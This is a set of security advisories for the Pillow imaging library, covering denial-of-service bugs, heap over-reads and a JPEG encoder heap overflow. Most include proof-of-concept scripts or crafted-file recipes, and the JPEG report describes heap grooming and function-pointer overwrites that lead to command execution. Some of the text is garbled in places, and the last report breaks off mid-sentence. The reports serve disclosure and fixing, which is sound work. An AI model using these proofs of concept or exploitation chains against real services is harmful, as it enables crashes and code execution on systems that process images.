> shared_dag["input_bytes"],     }     result = {         "pillow_version": PIL.__version__,         "pillow_file": PIL.__file__,         "depth": depth,         "linear_control": linear,         "shared_dag_candidate": shared_dag,         "checks": checks,         "overall_passed": all(checks.values()),     }     print(json.dumps(result, indent=2, sort_keys=True))     return 0 if result["overall_passed"] else 1   if __name__ == "__main__":     raise SystemExit(main()) ```  Run:  ```bash python3 poc_pillow_pdf_page_tree_dag.py ```  Expected result:  ```text "overall_passed": true "linear_control": observed_refs == 1 "shared_dag_candidate": input_bytes == 1410 "shared_dag_candidate": observed_refs == 8192 "shared_dag_candidate": distinct_refs == 1 ```  Observed on current `main` / `13.0.0.dev0`:  ```text 1410-byte input -> 8192 observed page refs -> 9.563007s append ```  Observed on Pillow `12.3.0`:  ```text Pillow 12.3.0: 1410-byte input -> 8192 observed page refs -> 9.670602s append ```  For comparison, the linear control in the same harness uses a comparable-depth page tree with `fanout=1`; it produces one page reference and completed append in about `0.016` to `0.028` seconds in my validation runs.  ### Impact  This is an availability issue in Pillow's PDF append handling. Applications are impacted if untrusted users can supply an existing PDF that the application later appends to, watermarks, or exports using Pillow's `Image.save(..., format="PDF", append=True)` route.  The demonstrated primitive is deterministic CPU/resource amplification from compact attacker-controlled PDF bytes. The proof does not demonstrate confidentiality impact, integrity impact, memory corruption, filesystem access, network access, or impact through ordinary `Image.open()`.  Requires attacker-influenced existing PDF processed by Pillow's documented PDF append path; not ordinary Image.open().  This should not be treated as just an unexpected Python exception. In the tested affected builds, the malformed PDF is accepted and processed to normal completion after the expensive expansion.  ### Remediation  Reject duplicate and cyclic page-tree references before constructing `self.pages` and `self.orig_pages`.  One possible fix is to pass traversal state through `linearize_page_tree()`:  - Track active `/Pages` references to reject cycles. - Track seen page-tree and page indirect references to reject duplicate references. - Raise `PdfFormatError` when the page tree is not an acyclic tree of unique indirect references.  Suggested regression tests:  - A small PDF whose `/Kids` array repeats the same child `/Pages` reference should raise `PdfFormatError` quickly when used through `Image.save(..., format="PDF", append=True)`. - A normal nested linear page tree should continue to append successfully.

### Summary `TarIO.__init__` does not check that a tar header's size field is positive. A crafted header with a negative size makes it seek backward onto itself. This causes an infinite loop that uses 100% CPU and never returns.  ### Details `TarIO.__init__` reads 512-byte tar headers one at a time, looking for a member with a given name. For each header it reads the size field and skips ahead to the next header:  ```python size = int(s[124:135], 8) ... self.fh.seek((size + 511) & (~511), io.SEEK_CUR) ``` There is no check that size is zero or more. A tar header can set this field to a negative octal value. For size = -512, the seek offset comes out to exactly -512, which cancels the 512 bytes the loop had just read. The file position goes right back to where this loop step started.  The loop only stops on end of file or when a header name starts with a null byte. Neither happens, since the same header keeps showing up again. The loop never ends on its own.  ### Steps to reproduce  This uses Tests/images/hopper.tar, a normal file already in the Pillow test suite. It only changes the size field of the first header.  ```python from PIL import TarIO  with open("Tests/images/hopper.tar", "rb") as f:     data = bytearray(f.read())  # Set the size field (bytes 124 to 135) to a negative octal value. # Octal 1000 is 512, so this is size = -512. data[124:135] = b"  -00001000"  with open("poisoned.tar", "wb") as f:     f.write(data)  # "does-not-exist" does not match the header name, so TarIO must # keep scanning. This call never returns. TarIO.TarIO("poisoned.tar", "does-not-exist") ```  We confirmed this with ps. The process sits at 98 to 100% CPU and never exits on its own. It only stops if killed from outside.  A pytest version of this, using pytest-timeout so the test does not hang forever, is below. On the current code it fails with Failed: Timeout (>3.0s) from pytest-timeout.  ```python from __future__ import annotations  from pathlib import Path  import pytest  from PIL import TarIO  SOURCE_TAR = "Tests/images/hopper.tar"   @pytest.mark.timeout(3) def test_negative_size_field_does_not_hang(tmp_path: Path) -> None:     with open(SOURCE_TAR, "rb") as f:         data = bytearray(f.read())      data[124:135] = b"  -00001000"  # octal 1000 = decimal 512, negated      poisoned_tar = tmp_path / "poisoned.tar"     poisoned_tar.write_bytes(data)      with pytest.raises((OSError, ValueError)):         with TarIO.TarIO(str(poisoned_tar), "does-not-exist"):             pass ``` ### Impact  - Availability: an attacker who can get a crafted tar file passed to TarIO.TarIO() can hang the process at full CPU with a file just over 512 bytes. - Confidentiality: none. - Integrity: none. - TarIO is a small helper class. It is not used by Image.open() and is not on the default path most Pillow users hit. An app has to call PIL.TarIO.TarIO(path, member_name) directly for this to matter, which some apps do to read an image out of a tar archive.

### Summary Pillow multi-frame image loaders can retain native `ImagingCore` storage allocated for one frame while changing the Python-side image `mode` and decoder tiles for a later frame.  If frame 0 allocates storage for a narrow mode such as `L`, and a later frame of the same dimensions switches to a wider mode such as `RGB` or `CMYK`, Pillow may decode wider pixels into the stale narrow native buffer. This causes native out-of-bounds writes and process crashes. In the MPO/JPEG path, I also demonstrated command execution in matching Python/Pillow runtime profiles through Pillow's documented `ImageSequence.Iterator` + `frame.load()` path.  ### Details The root cause appears to be that `ImageFile.load_prepare()` only reallocates native storage when `_im is None`. It does not verify that the retained native `ImagingCore` storage still matches `self.mode` and `self.size`.  Several multi-frame `seek()` / `_open()` paths can update `self._mode` and decoder tiles for a later frame without invalidating `_im`. The decoder then writes or reads according to the new frame mode while the native storage still belongs to the old frame mode.  Verified affected surfaces:  1. **PSD**     `PsdImageFile.seek()` can switch from grayscale/native `L` storage to RGB layer decoding while retaining `_im`. This produces attacker-controlled native out-of-bounds writes and reliable crashes.  2. **MPO/JPEG**     A crafted two-frame MPO can make frame 0 allocate `L` storage, then make frame 1 decode `CMYK` / `RGB` data into the retained `L` storage. The documented `ImageSequence.Iterator` path reaches this with `frame.load()`.    Verified native memory corruption, crash, over-read behavior, and scoped harmless-marker command execution on Pillow 12.3.0.  3. **DCX**     `DcxImageFile.seek()` calls `PcxImageFile._open()`, which changes mode/tile  state without a native-storage mode guard. A crafted DCX with `L` then `RGB` PCX frames produces retained-storage mismatch and crash.  4. **MIC**     MIC can call `TiffImageFile._open()` directly and bypass TIFF's normal guarded `seek()` behavior. With a `NextIFD`-based reachable frame transition, this produces retained-storage mismatch and crash.  TIFF appears to be a useful positive control because its `seek()` path checks both size and mode before reusing storage.  ### Impact - process crash / denial of service, - native out-of-bounds write, - native over-read in the MPO path.  Stronger proven impact:  - command execution in matching Python/Pillow runtime profiles through the MPO/JPEG path.  Server-side deployment impact:  - Create a local vulnerable web upload service that accepts an unauthenticated MPO upload and automatically processes it with Pillow. - The attack is one HTTP request and requires no user interaction after upload. - The fixed harmless command-output marker succeeded 10/10 times. - The `_im=None` control was clean 10/10 times.   ## Reproduction Evidence  Tested version:  ```text Pillow 12.3.0 ```  MPO terminal proof environments:  ```text Python 3.12.3 + Pillow 12.3.0, clean PyPI environment: marker 10/10, control 0/10  Python 3.13.14 + Pillow 12.3.0, prepared profile: marker 10/10, control 0/10 ```  Server-side web-upload proof:  ```text control 1..10: MARKER_MISSING control_summary ok 0 missing 10 /10  vulnerable 1..10: MARKER_OK marker_output <server-user> vulnerable_summary ok 10 missing 0 /10 ```  The terminal proof uses a fixed harmless marker command only. It does not use a reverse shell, persistence, data exfiltration, or arbitrary attacker-selected commands.  I can provide the following private artifacts to maintainers:  - minimal crash fixtures for PSD, MPO, DCX, and MIC, - non-weaponized MPO marker PoC, - local vulnerable web upload demo, - gdb/GEF geometry receipts, - control-run logs, - proposed regression-test shape.  ## Minimal Reproduction Shape  For the MPO path, the vulnerable consumer shape is:  ```python from io import BytesIO from PIL import Image, ImageSequence  source = BytesIO(open(path, "rb").read()) image = Image.open(source) iterator = ImageSequence.Iterator(image) next(iterator).load() next(iterator).load() ```  The crafted image shape is:  ```text frame 0: mode L, dimensions W x H frame 1: same W x H, wider mode such as CMYK ```  Frame 0 allocates native `L` storage. Frame 1 changes the logical mode and decoder state but can reuse the old native storage. The frame 1 decoder writes using the wider mode into the narrow storage.  ## Suggested Fix Direction  Before reusing native `ImagingCore` storage, Pillow should verify that the retained storage is compatible with the current logical image mode and size.  A central guard in `ImageFile.load_prepare()` could compare native storage mode/size against `self.mode` / `self.size` and allocate fresh storage when they differ. Alternatively, every mode-changing `seek()` / `_open()` path should explicitly invalidate `_im` before decoding.  Caution: TIFF has specialized tile-size behavior and already has a mode/size guard, so a central fix should avoid regressing TIFF tile-buffer handling.   ## Credit  ```text Rotem Kama ```  ## Methodology Note  AI-assisted analysis was used for discovery and verification support. Claims in this report are limited to the local artifacts, controls, and command outputs described above.

### Summary   A PNG file with a large eXIf chunk full of repeated 6-byte markers makes Pillow's EXIF parser take seconds of CPU instead of milliseconds. The cost grows with the square of the chunk size, so a normal small-photo-sized file is enough to cause real delay.    ### Details   `Exif.load()` in `src/PIL/Image.py` strips a marker from the start of the EXIF data like this:    ```python   while data and data.startswith(b"Exif\x00\x00"):       data = data[6:]   ```    Each pass makes a new copy of the remaining data. A real camera writes this marker once, so this is not normally a problem.    `chunk_eXIf()` in `src/PIL/PngImagePlugin.py` puts the raw PNG eXIf chunk straight into `info["exif"]` with no size limit and no check of its content. PNG text chunks (tEXt, zTXt, iTXt) are capped with `MAX_TEXT_CHUNK` and `MAX_TEXT_MEMORY`. The eXIf chunk has no such cap.    If the eXIf chunk is filled with repeated `Exif\x00\x00` markers instead of real EXIF data, the strip loop runs once per marker, copying a large buffer each time. This is a classic quadratic time bug.    ### Steps to reproduce   This builds a small PNG in memory and times `Image.open().getexif()` on it. No external file needed.    ```python   import time   from io import BytesIO   from PIL import Image, PngImagePlugin    def chunk(cid, *data):       fp = BytesIO()       PngImagePlugin.putchunk(fp, cid, *data)       return fp.getvalue()    MAGIC = PngImagePlugin._MAGIC   IHDR = chunk(b"IHDR", PngImagePlugin.o32(1), PngImagePlugin.o32(1), b"\x08\x02", b"\0\0\0")   IDAT = chunk(b"IDAT")   IEND = chunk(b"IEND")    marker = b"Exif\x00\x00"   exif_chunk = chunk(b"eXIf", marker * 300_000)  # 1.8MB, all markers   data = MAGIC + IHDR + exif_chunk + IDAT + IEND    start = time.time()   with Image.open(BytesIO(data)) as im:       im.getexif()   print("took", time.time() - start, "seconds")   ```    Expected output on a fixed version: well under 0.1 seconds, the same as a normal file this size.    Actual output on the current code: around 3.5 to 3.7 seconds, for a single 1.8MB file. We checked with a prohis time is spent inside the strip loop itself, not somewhere else. We also checked the growth rate across a   few sizes (200KB, 600KB, 1.2MB, 1.8MB) and it matches quadratic growth closely, not linear.    A pytest version of this test, using `pytest-timeout` so a test run does not hang if the bug is present, is  it fails with `Failed: Timeout (>2.0s) from pytest-timeout`.    ```python   import pytest   from io import BytesIO   from PIL import Image, PngImagePlugin    def chunk(cid, *data):       fp = BytesIO()       PngImagePlugin.putchunk(fp, cid, *data)       return fp.getvalue()    MAGIC = PngImagePlugin._MAGIC   IHDR = chunk(b"IHDR", PngImagePlugin.o32(1), PngImagePlugin.o32(1), b"\x08\x02", b"\0\0\0")   IDAT = chunk(b"IDAT")   IEND = chunk(b"IEND")    @pytest.mark.timeout(2)   def test_exif_load_is_not_quadratic():       marker = b"Exif\x00\x00"       exif_chunk = chunk(b"eXIf", marker * 300_000)       data = MAGIC + IHDR + exif_chunk + IDAT + IEND       with Image.open(BytesIO(data)) as im:           im.getexif()   ```    ### Impact   - Availability: an attacker who can get one PNG file processed can burn several seconds of CPU per request w A bigger file scales worse, since the cost is quadratic, not linear.   - Confidentiality: none.   - Integrity: none.   - This fires through `Image.getexif()`, `Image._getexif()`, and `ImageOps.exif_transpose()`. `exif_transpose()` is the function Pillow's own docs recommend for auto-rotating user photos, so this can hit normal upload handling code, not just an unusual call.

## Summary SpiderImagePlugin's seek() bypasses the decompression bomb check, allowing a tiny (<1KB) crafted SPIDER stack file to trigger a multi-gigabyte allocation on im.load().  ## Affected versions All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)  ## Root cause Image.open() runs Image._decompression_bomb_check(im.size) exactly once, in _open_core (src/PIL/Image.py:3668), right after the initial _open().   SPIDER stack files are multi-frame: SpiderImageFile.seek(frame) (SpiderImagePlugin.py:179-190) computes an attacker-influenced stkoffset and calls self._open() AGAIN directly (line 190) — NOT through Image.open(). _open() re-parses a fresh 27-float header at that offset and reassigns:      self._size = int(h[12]), int(h[2])      # SpiderImagePlugin.py:131  straight from unvalidated header floats (isSpiderHeader only checks internal labrec*lenbyt==labbyt consistency, never bounds nsam/nrow). No bomb check runs on this new size.  On the subsequent load(), ImageFile.load_prepare() (ImageFile.py:436-437) executes `self.im = Image.core.new(self.mode, self.size)` with the unchecked, attacker-chosen size. Mode is always "F" (4 bytes/pixel), so e.g. 40000x40000 = 6.4 GB.  ## Why this is a real bug Sibling multi-frame plugins DO re-check on their alternate paths: - GifImagePlugin.py:286 - Image._decompression_bomb_check(self._size) (in seek) - TiffImagePlugin.py:1309 - Image._decompression_bomb_check(self._tile_size) - IcnsImagePlugin.py:121/138, IcoImagePlugin.py:236/240 (sub-image selection)  SpiderImagePlugin has NO bomb check anywhere. This is the same class of bug just fixed for GdImageFile (GHSA-phj9-mv4w-65pm) and the FontFile classes (GHSA-5x94/8v84/45hq): an allocation reached on a non-Image.open() path sized by an attacker header field, independent of the one-time pixel bomb check.  ## Reproduction Python 3.13, Pillow HEAD e7a7ea84  Attached: pillow_poc_spider_bomb.py  Sets Image.MAX_IMAGE_PIXELS=5000, then: - CONTROL: Image.open(standalone 100x100 SPIDER) -> DecompressionBombWarning fires correctly. - BYPASS: Image.open(stack, frame0=1x1) passes; im.seek(1) sets size (100,100) with NO DecompressionBombWarning/Error -> the check is bypassed.  Real-world impact: a large frame-1 nsam/nrow (e.g. 40000x40000) causes im.load() to allocate ~6.4 GB (mode F) with the bomb check fully bypassed, from a file under 1 KB.  ## Suggested fix Call Image._decompression_bomb_check(self.size) at the end of SpiderImageFile._open() (or in seek() after _open()), mirroring GifImagePlugin / TiffImagePlugin. Optionally validate nsam/nrow are positive and sane in _open().  Credit: Yazan Balawneh - CyStack Security Team  [pillow_poc_spider_bomb.py](https://github.com/user-attachments/files/30244916/pillow_poc_spider_bomb.py)

### Summary On Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native `drawwmf` handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.  ### Details The EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:  - `src/PIL/WmfImagePlugin.py:121-129` reads the bounding box; `:148` stores it; the size reaches the native handler through `src/PIL/WmfImagePlugin.py:56`.  In the native handler the DIB header fields `bcWidth` and `bcHeight` are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:  - `src/display.c:793-794` assign the 16-bit fields - `src/display.c:800` sizes the allocation from them - `src/display.c:827` copies `height * ((width * 3 + 3) & -4)` bytes using the full values  The whole handler is compiled only on Windows (`#ifdef _WIN32`, `src/display.c:33-841`).  ### PoC ```python import struct from PIL import Image  def L(v):     return struct.pack("<i", v)  # Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the # decompression-bomb check, but the width truncates to 16 bits for the allocation while # the copy uses 70000. emf  = b"\x01\x00\x00\x00" + L(88)          # record type + size emf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1 emf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc) emf += b" EMF"                              # signature at offset 40 emf += bytes(44) open("poc.emf", "wb").write(emf)  im = Image.open("poc.emf") print("size:", im.size, "pixels:", im.size[0] * im.size[1]) im.load()                                   # over-read happens here on a Windows build ```  On Linux the first part is observable: the 88-byte file opens, `size` is `(70000, 1)`, and the bomb check passes. The native over-read only exists on Windows because `Image.core.drawwmf` is compiled out elsewhere (on Linux `im.load()` raises `OSError` instead).  ### Impact CWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process.

``` ============================================================================ Heap buffer overflow writing JPEG comment after ICC profile fills buffer Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.  The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.  Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., "JPEG", icc_profile=im.info.get("icc_profile"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.  The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.  The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.  ## Details  `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.  A JPEG laid out as  ``` FFD8                                   SOI FFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"] FFFE <len> <comment, any length 1..65533>           -> im.info["comment"] <any baseline RGB JPEG body> ```  opened with `Image.open()` and re-saved with the usual colour-profile-preserving call  ```python im.save(out, "JPEG", icc_profile=im.info.get("icc_profile")) ```  kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.  ### Code path  The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:  ```python # src/PIL/JpegImagePlugin.py:859-862     else:         # The EXIF info needs to be written as one block, + APP1, + one spare byte.         # Ensure that our buffer is big enough. Same with the icc_profile block.         bufsize = max(len(exif) + 5, len(extra) + 1) ```  `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).  The "+1 spare byte" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(&cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:  ```c // src/libImaging/JpegEncode.c:302-337         case 3:             if (context->extra) {                 unsigned int n = context->extra_size - context->extra_offset;                 if (n > context->destination.pub.free_in_buffer) {                     n = context->destination.pub.free_in_buffer;                 }                 memcpy(context->destination.pub.next_output_byte, context->extra + context->extra_offset, n);                 context->destination.pub.next_output_byte += n;                 context->destination.pub.free_in_buffer -= n;                 context->extra_offset += n;                 if (context->extra_offset >= context->extra_size) {                     state->state++;                 // done -> fall into case 4, even with free_in_buffer == 0                 } else {                     break;                 }             } …          case 4:             if (context->comment) {                 jpeg_write_marker(&context->cinfo, JPEG_COM,                                   (unsigned char *)context->comment, context->comment_size);   // :330 — no space check             }             state->state++;          case 5:             if (1024 > context->destination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64                 break;             }             … jpeg_write_scanlines(…) … ```  Every other emitting state is guarded — state 2 requires `rawExifLen + 5 <= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.  With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is  ```c /* jcmarker.c */   *(dest->next_output_byte)++ = (JOCTET)val;   if (--dest->free_in_buffer == 0) { if (!(*dest->empty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); } ```  i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(&buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.  All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info["icc_profile"]` (`:238-241`) and stores the COM payload in `im.info["comment"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get("comment", im.info.get("comment"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info["icc_profile"]` and a `tEXt` chunk keyed `comment` becomes `im.info["comment"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert("RGB") → save("JPEG", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `"Created with GIMP"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.  ### What lies behind the buffer  The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo->main->process_data`) read from bytes the file supplied.  ## Impact  Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get("icc_profile")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.  It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context->comment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.  ## Reproducing  `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.  The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.  Each file goes through the same application code in a child `python3 -X faulthandler` process:  ```python im = Image.open(BytesIO(data)) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) ```  1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless. 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info["comment"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.  Expected output: the control prints `save returned normally` and `-> exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-> exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.  ## Suggested fix  The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:  ```diff --- a/src/libImaging/JpegEncode.c +++ b/src/libImaging/JpegEncode.c @@ -327,6 +327,11 @@          case 4:                if (context->comment) { +                // check for comment len + 'COM' header bytes +                if (context->comment_size + 5 > +                    context->destination.pub.free_in_buffer) { +                    break; +                }                  jpeg_write_marker( ```  The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b""`) so the length is exact for non-ASCII `str` comments; 